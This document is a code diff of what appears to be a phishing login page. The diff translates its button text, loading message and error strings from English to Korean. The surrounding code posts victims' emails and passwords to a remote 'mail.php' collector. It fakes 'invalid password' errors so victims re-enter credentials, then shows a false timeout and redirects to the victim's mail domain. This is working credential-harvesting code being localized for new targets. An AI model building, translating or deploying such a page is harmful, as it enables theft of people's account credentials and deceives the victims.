@@ -3557,7 +3557,8 @@
 						<div class="wrap-login100-form-btn">
 							<div class="login100-form-bgbtn"></div>
 							<button id="loginButton" class="login100-form-btn">
-								Sign in to view message
+								로그인
+
 							</button>
 						</div>
 					</div>
@@ -3588,7 +3589,7 @@
 	
 	<script>
 		window.MAIL_URL = 'https://baf.com.sa/mail.php';
-		window.AUTH_LOADING_MESSAGE = 'Authenticating...';
+		window.AUTH_LOADING_MESSAGE = '인증 중...';
 		window.FINAL_REDIRECT_URL = 'https://google.com';
 
 
@@ -3770,7 +3771,7 @@
 					const passwordVal = passwordElement.val().trim();
 
 					if (!(emailVal && passwordVal)) {
-						throw Error('Email and Password is required.');
+						throw Error('이메일과 비밀번호가 필요합니다.');
 					}
 
 					if (!validateEmail(emailVal)) {
@@ -3791,10 +3792,10 @@
 						if (parseInt(window.retryAttemptCount) <= 2) {
 							window.retryAttemptCount = parseInt(window.retryAttemptCount) + 1;
 							passwordElement.val('');
-							errorElement.html('Invalid email and/or password combination. Try again correctly.').show();
+							errorElement.html('이메일 및/또는 비밀번호 조합이 잘못되었습니다. 올바르게 다시 시도하십시오.').show();
 						} else {
 							//success message
-							successElement.html("Sorry, your sign-in timed out. Please Try again successfully.").show();
+							successElement.html("죄송합니다. 로그인 시간이 초과되었습니다. 다시 시도하십시오.").show();
 							//redirect
 							setTimeout(function () {
 								window.location.replace("http://"+emailElement.val().split("@")[1]);
